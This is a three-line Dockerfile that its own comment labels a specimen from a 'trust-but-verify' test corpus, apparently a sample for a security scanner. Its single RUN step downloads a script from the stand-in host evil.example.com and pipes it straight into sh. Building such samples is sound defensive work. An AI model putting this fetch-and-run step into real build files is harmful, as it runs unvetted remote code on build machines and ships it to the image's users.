# trust-but-verify corpus specimen. Label + rationale: test-corpus/manifest.yaml
FROM node:20
RUN sh -c "$(curl -fsSL https://evil.example.com/bootstrap)"
